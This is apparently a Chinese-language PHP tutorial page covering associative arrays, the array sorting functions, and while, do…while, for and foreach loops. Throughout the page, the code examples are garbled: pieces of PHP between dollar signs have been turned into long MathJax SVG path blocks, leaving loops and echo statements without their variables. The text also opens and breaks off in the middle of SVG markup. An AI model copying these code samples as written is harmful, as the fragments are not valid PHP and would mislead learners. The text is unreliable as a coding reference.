<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="1432" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1731" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="2197" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="2798" y="0"></use>
 <use xlink:href="#E1-MJMATHI-74" x="3278" y="0"></use>
 <use xlink:href="#E1-MJMATHI-68" x="3640" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3B" x="4216" y="0"></use>
</g>
</svg>x++)<br>&#123;<br>	echo <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.023ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 2162.5 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">cars[</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="433" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="963" y="0"></use>
 <use xlink:href="#E1-MJMATHI-73" x="1414" y="0"></use>
 <use xlink:href="#E1-MJMAIN-5B" x="1884" y="0"></use>
</g>
</svg>x];<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307192004713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复现了哦！</p>
<p><strong>关联数组</strong><br>关联数组是使用您分配给数组的指定的键的数组。<br>这里有两种创建的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);<br></code></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">$age[&#39;Peter&#39;]&#x3D;&quot;35&quot;;<br>$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;<br>$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307194109119.png" alt="在这里插入图片描述"><br><strong>遍历关联数组</strong><br>遍历并打印关联数组中的所有值，您可以使用 foreach 循环，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.75ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 2475.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">age as </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-67" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-67" x="529" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="1010" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="1476" y="0"></use>
 <use xlink:href="#E1-MJMATHI-73" x="2006" y="0"></use>
</g>
</svg>x&#x3D;&gt;$x_value)<br>&#123;<br>	echo &quot;key&#x3D;&quot; . <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.478ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 5372.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x . ", value" . </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
<path stroke-width="1" id="E1-MJMATHI-76" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6C" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2E" x="572" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="1017" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="1518" y="0"></use>
 <use xlink:href="#E1-MJMATHI-76" x="1963" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="2448" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6C" x="2978" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="3276" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="3849" y="0"></use>
 <use xlink:href="#E1-MJMAIN-22" x="4593" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2E" x="5094" y="0"></use>
</g>
</svg>x_value;<br>	echo &quot;&lt;br&gt;&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307194444482.png" alt="在这里插入图片描述"></p>
<h1 id="二、数组排序"><a href="#二、数组排序" class="headerlink" title="二、数组排序"></a>二、数组排序</h1><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。</p>
<p><strong>数组排序函数</strong></p>
<ul>
<li>sort() - 对数组进行升序排列</li>
<li>rsort() - 对数组进行降序排列</li>
<li>asort() - 根据关联数组的值，对数组进行升序排列</li>
<li>ksort() - 根据关联数组的键，对数组进行升序排列</li>
<li>arsort() - 根据关联数组的值，对数组进行降序排列</li>
<li>krsort() - 根据关联数组的键，对数组进行降序排列</li>
</ul>
<p><strong>sort() - 对数组进行升序排列</strong></p>
<p>将数组中的元素按照字母升序排列<br><img src="https://img-blog.csdnimg.cn/20210307201128722.png" alt="在这里插入图片描述"></p>
<p><strong>rsort() - 对数组进行降序排列</strong></p>
<p>将数组中的元素按照字母降序排列<br><img src="https://img-blog.csdnimg.cn/20210307201144126.png" alt="在这里插入图片描述"></p>
<p><strong>asort() - 根据数组的值，对数组进行升序排列</strong><br><img src="https://img-blog.csdnimg.cn/2021030720222566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>ksort() - 根据数组的键，对数组进行升序排列</strong><br><img src="https://img-blog.csdnimg.cn/20210307202349993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据以上：<br><strong>arsort() - 根据数组的值，对数组进行降序排列</strong></p>
<p><strong>krsort() - 根据数组的键，对数组进行降序排列</strong></p>
<h1 id="三-While-循环"><a href="#三-While-循环" class="headerlink" title="三. While 循环"></a>三. While 循环</h1><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。<br>在您编写代码时，您经常需要让相同的代码块一次又一次地重复运行。我们可以在代码中使用循环语句来完成这个任务。</p>
<p>在 PHP 中，提供了下列循环语句：</p>
<ul>
<li>while - 只要指定的条件成立，则循环执行代码块</li>
<li>do…while - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li>
<li>for - 循环执行代码块指定的次数</li>
<li>foreach - 根据数组中每个元素来循环代码块</li>
</ul>
<p><strong>while 循环</strong><br>while 循环将重复执行代码块，直到指定的条件不成立</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">while (条件)<br>&#123;<br>    要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307202753922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>do…while 语句</strong></p>
<p>do…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">do<br>&#123;<br>    要执行的代码;<br>&#125;<br>while (条件);<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307203113503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="四-For-循环"><a href="#四-For-循环" class="headerlink" title="四.For 循环"></a>四.For 循环</h1><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">for (初始值; 条件; 增量)<br>&#123;<br>    要执行的代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307203446967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>foreach 循环</strong><br>foreach 循环用于遍历数组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.033ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 3458.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">array as </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="1432" y="0"></use>
 <use xlink:href="#E1-MJMATHI-79" x="1962" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="2459" y="0"></use>
 <use xlink:href="#E1-MJMATHI-73" x="2989" y="0"></use>
</g>
</svg>value)<br>&#123;<br>    要执行代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p>
<p><img src="https://img-blog.csdnimg.cn/20210307203956898.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">foreach (<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.033ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 3458.5 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">array as </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
